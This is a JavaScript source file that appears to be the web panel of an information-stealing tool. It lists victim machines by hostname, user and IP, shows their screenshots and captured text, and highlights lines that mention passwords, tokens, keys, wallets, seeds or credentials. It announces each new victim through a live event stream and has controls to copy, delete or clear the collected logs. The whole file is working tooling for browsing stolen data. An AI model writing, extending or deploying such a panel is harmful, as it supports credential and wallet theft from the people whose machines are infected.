let clients = []
let selected = null
let searchterm = ''

function refr() {
  fetch('/api/clients').then(r => r.json()).then(list => {
    clients = list
    render()
    if (selected && !clients.find(c => c.id === selected)) {
      selected = null
      document.getElementById('detail').classList.remove('show')
    }
    document.getElementById('sbstats').textContent = clients.length
  })
}

function render() {
  const el = document.getElementById('clientlist')
  const filtered = clients.filter(c => !searchterm || c.hostname.toLowerCase().includes(searchterm) || (c.user || '').toLowerCase().includes(searchterm) || (c.ip || '').toLowerCase().includes(searchterm))
  if (filtered.length === 0) {
    el.innerHTML = '<div class="empty">' + (searchterm ? 'no match' : 'no clients yet') + '</div>'
    return
  }
  el.innerHTML = ''
  for (const c of filtered) {
    const div = document.createElement('div')
    div.className = 'client' + (c.id === selected ? ' active' : '')
    const tags = []
    if (c.has_ss) tags.push('<span class="ctag ss">ss</span>')
    div.innerHTML = `<div class="chost">${esc(c.hostname)} ${tags.join('')}</div><div class="cmeta"><span>${esc(c.user || '?')}</span><span>${esc(c.ip || '?')}</span><span>${reltime(c.time)}</span></div>`
    div.onclick = () => showdetail(c.id)
    el.appendChild(div)
  }
  if (selected) {
    const sel = el.querySelector('.client.active')
    if (sel) sel.scrollIntoView({ block: 'nearest', behavior: 'smooth' })
  }
}

function showdetail(id) {
  selected = id
  render()
  fetch('/api/client/' + id).then(r => r.json()).then(data => {
    const wel = document.getElementById('welcome')
    if (wel) wel.style.display = 'none'
    const el = document.getElementById('detail')
    el.className = 'show'
    let html = '<div class="dhead"><h2>' + esc(data.hostname) + '</h2><div class="dbtns"><button onclick="copyall(\'' + id + '\')">copy</button><button class="del" onclick="delclient(\'' + id + '\')">delete</button></div></div>'
    html += '<div class="dmeta"><div class="dm"><strong>user</strong> ' + esc(data.user) + '</div><div class="dm"><strong>ip</strong> ' + esc(data.ip || '?') + '</div><div class="dm"><strong>time</strong> ' + new Date(data.time).toLocaleString() + '</div></div>'
    if (data.screenshot) {
      html += '<div class="dss" onclick="window.open(this.querySelector(\'img\').src)"><img src="data:image/png;base64,' + data.screenshot + '"></div>'
    }
    html += '<div class="ddata">' + fmtd(data.data || '') + '</div>'
    el.innerHTML = html
  })
}

function fmtd(text) {
  if (!text) return ''
  return esc(text).split('\n').map(l => {
    if (/^===/.test(l)) return '<div class="sechead">' + esc(l.replace(/=/g, '').trim()) + '</div>'
    if (/token|password|pass|key|secret|wallet|seed|credential|auth/i.test(l)) return '<div class="hit">' + esc(l) + '</div>'
    return esc(l)
  }).join('\n')
}

function delclient(id) {
  if (!confirm('delete ' + id + '?')) return
  fetch('/api/delete/' + id).then(() => {
    if (selected === id) { selected = null; document.getElementById('detail').classList.remove('show') }
    refr()
  })
}

function clearall() {
  if (!confirm('clear all data?')) return
  fetch('/api/clearlog').then(refr)
}

function onsearch() {
  searchterm = document.getElementById('search').value.toLowerCase()
  render()
}

function copyall(id) {
  fetch('/api/client/' + id).then(r => r.json()).then(data => {
    const txt = data.data || ''
    navigator.clipboard.writeText(txt).then(() => toast('copied to clipboard'))
  })
}

function toast(msg) {
  const el = document.createElement('div')
  el.className = 'toast'
  el.textContent = msg
  document.getElementById('toasts').appendChild(el)
  setTimeout(() => el.remove(), 3500)
}

function esc(s) {
  const d = document.createElement('div')
  d.textContent = s || ''
  return d.innerHTML
}

function reltime(iso) {
  const diff = Date.now() - new Date(iso).getTime()
  if (diff < 60000) return 'now'
  if (diff < 3600000) return Math.floor(diff / 60000) + 'm'
  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h'
  return Math.floor(diff / 86400000) + 'd'
}

if (window.EventSource) {
  const sse = new EventSource('/api/sse')
  sse.addEventListener('newclient', e => {
    const d = JSON.parse(e.data)
    refr()
    if (!document.hidden) toast('new: ' + d.hostname)
  })
  sse.addEventListener('deleted', e => refr())
  sse.addEventListener('cleared', e => refr())
  sse.addEventListener('connected', () => refr())
  sse.onerror = () => {}
}

refr()
setInterval(refr, 15000)
